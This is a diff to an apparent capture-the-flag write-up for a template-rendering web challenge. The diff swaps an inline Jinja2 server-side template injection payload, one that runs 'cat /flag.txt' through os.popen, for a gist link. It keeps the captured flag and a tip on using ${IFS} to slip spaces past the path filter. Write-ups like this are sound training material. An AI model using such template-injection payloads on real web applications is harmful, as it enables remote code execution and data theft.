@@ -36,13 +36,12 @@ Boom! template rendering applied.
 
 Let's jump in to try out RCE payloads. 
 
-
-```javascript 
-{{request.application.__globals__.__builtins__.__import__("os").popen("cat${IFS}/flag.txt").read()}}
-```
+[Payload Gist](https://gist.githubusercontent.com/J0LGER/5b9c747d55ab90c2cf9f3e87078bd91c/raw/c75ca4649a1c056795235acf2eeb50ebd36cb082/Templated) 
 
 We get the flag.txt 
 ```
 HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
 ``` 
-_*TIP*_: We can use the Internal Field Separator bash variable _${IFS}_ in order to inject bash spaces since endpoint path should not contain whitespaces. 
+_*TIP*_: We can use the Internal Field Separator bash variable _${IFS}_ in order to inject bash spaces since endpoint path should not contain whitespaces.
+  
+## Thank you for reading!
